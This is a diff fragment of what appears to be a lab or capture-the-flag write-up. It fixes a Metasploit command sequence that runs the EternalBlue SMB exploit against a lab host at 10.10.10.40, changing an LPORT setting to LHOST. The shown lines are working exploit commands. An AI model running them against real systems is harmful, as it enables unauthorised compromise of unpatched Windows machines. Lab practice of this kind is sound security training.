@@ -96,7 +96,7 @@ Matching Modules
 
 use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS 10.10.10.40
-set LPORT tun0
+set LHOST tun0
 run
 ```
 
